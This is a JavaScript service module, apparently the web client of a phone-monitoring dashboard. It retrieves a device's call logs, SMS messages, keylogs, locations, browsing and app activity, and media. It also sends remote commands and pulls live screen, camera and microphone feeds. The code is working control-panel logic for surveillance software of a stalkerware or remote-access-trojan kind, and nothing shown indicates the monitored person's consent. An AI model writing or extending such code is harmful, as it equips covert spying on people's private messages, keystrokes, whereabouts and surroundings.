import axios from 'axios';

const BASE_URL = import.meta.env.VITE_API_URL || 'https://monitoring.joclass.com/api/v1';
const API_URL = BASE_URL.replace(/\/$/, '');

axios.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      localStorage.removeItem('token');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);

const getAuthHeaders = (token) => ({
  headers: {
    Authorization: `Bearer ${token}`,
  },
});

const getCallLogs = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/call_logs/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getSmsMessages = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/sms_messages/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getAppUsage = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/app_usage/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getWebActivity = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/web_activity/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getLocations = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/locations/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getInstalledApps = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/installed_apps/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getNotifications = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/notifications/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getKeylogs = (token, skip = 0, limit = 100, deviceId = null) => {
  let url = `${API_URL}/users/me/keylogs/?skip=${skip}&limit=${limit}`;
  if (deviceId) url += `&device_id=${deviceId}`;
  return axios.get(url, getAuthHeaders(token));
};

const getDevices = (token) => {
  return axios.get(`${API_URL}/devices/`, getAuthHeaders(token));
};

const sendCommand = (token, deviceId, commandType) => {
  return axios.post(`${API_URL}/devices/${deviceId}/commands/`, { command_type: commandType }, getAuthHeaders(token));
};

const getDeviceMedia = (token, deviceId, skip = 0, limit = 50, category = null) => {
  let url = `${API_URL}/devices/${deviceId}/media?skip=${skip}&limit=${limit}`;
  if (category) url += `&category=${category}`;
  return axios.get(url, getAuthHeaders(token));
};

const deleteDevice = (token, deviceId) => {
  return axios.delete(`${API_URL}/devices/${deviceId}`, getAuthHeaders(token));
};

const dataService = {
  getCallLogs,
  getSmsMessages,
  getAppUsage,
  getWebActivity,
  getLocations,
  getDevices,
  getInstalledApps,
  getNotifications,
  getKeylogs,
  sendCommand,
  getDeviceMedia,
  deleteDevice,
  startLiveView: async (deviceId, token) => {
    return axios.post(`${API_URL}/devices/${deviceId}/commands/`, { command_type: 'START_SCREEN_FEED' }, getAuthHeaders(token || localStorage.getItem('token')));
  },
  stopLiveView: async (deviceId, token) => {
    return axios.post(`${API_URL}/devices/${deviceId}/commands/`, { command_type: 'STOP_SCREEN_FEED' }, getAuthHeaders(token || localStorage.getItem('token')));
  },
  sendCommandPayload: (token, deviceId, commandType, payload) => {
    return axios.post(`${API_URL}/devices/${deviceId}/commands/`, { command_type: commandType, payload: payload }, getAuthHeaders(token || localStorage.getItem('token')));
  },
  getLatestLiveFrameUrl: (deviceId) => {
    return `${API_URL}/live-screen/latest?device_id=${deviceId}&t=${Date.now()}`;
  },
  getLiveFrameBlob: async (deviceId, token) => {
    return axios.get(`${API_URL}/live-screen/latest?device_id=${deviceId}&t=${Date.now()}`, {
      responseType: 'blob',
      ...getAuthHeaders(token || localStorage.getItem('token'))
    });
  },
  getLiveCameraBlob: async (deviceId, token) => {
    return axios.get(`${API_URL}/live-camera/latest?device_id=${deviceId}&t=${Date.now()}`, {
      responseType: 'blob',
      ...getAuthHeaders(token || localStorage.getItem('token'))
    });
  },
  getLiveAudioBlob: async (deviceId, token) => {
    return axios.get(`${API_URL}/live-audio/latest?device_id=${deviceId}&t=${Date.now()}`, {
      responseType: 'blob',
      ...getAuthHeaders(token || localStorage.getItem('token'))
    });
  },
};

export default dataService;


